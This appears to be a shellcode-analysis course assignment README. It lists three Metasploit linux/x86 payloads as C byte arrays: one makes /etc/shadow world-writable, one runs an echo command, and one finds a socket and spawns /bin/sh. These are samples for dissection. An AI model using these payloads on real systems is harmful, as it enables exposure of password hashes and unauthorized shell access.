Assignment #5, Shellcode Analysis
=================================

Instructions:
-------------
* Take up at least 3 shellcode samples created using msfpayload for linux/x86
* Use GDB/Ndisasm/Libemu to dissect the functionality of the shellcode
* Present your analysis (http://www.paolostivanin.com/blog/)

Shellcode 1:
------------
```
/*
 * linux/x86/chmod - 36 bytes
 * http://www.metasploit.com
 * FILE=/etc/shadow, MODE=0666
 */
unsigned char buf[] = 
"\x99\x6a\x0f\x58\x52\xe8\x0c\x00\x00\x00\x2f\x65\x74\x63\x2f"
"\x73\x68\x61\x64\x6f\x77\x00\x5b\x68\xb6\x01\x00\x00\x59\xcd"
"\x80\x6a\x01\x58\xcd\x80";
```

Shellcode 2:
------------
```
/*
 * linux/x86/exec - 47 bytes
 * http://www.metasploit.com
 * CMD=echo SLAE32
 */
unsigned char buf[] = 
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
"\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x0c\x00\x00\x00\x65"
"\x63\x68\x6f\x20\x53\x4c\x41\x45\x33\x32\x00\x57\x53\x89\xe1"
"\xcd\x80";
```

Shellcode 3:
------------
```
/*
 * linux/x86/shell_find_port - 62 bytes
 * http://www.metasploit.com
 */
unsigned char buf[] = 
"\x31\xdb\x53\x89\xe7\x6a\x10\x54\x57\x53\x89\xe1\xb3\x07\xff"
"\x01\x6a\x66\x58\xcd\x80\x66\x81\x7f\x02\x8e\xf9\x75\xf1\x5b"
"\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x50\x68\x2f\x2f\x73"
"\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b"
"\xcd\x80";
```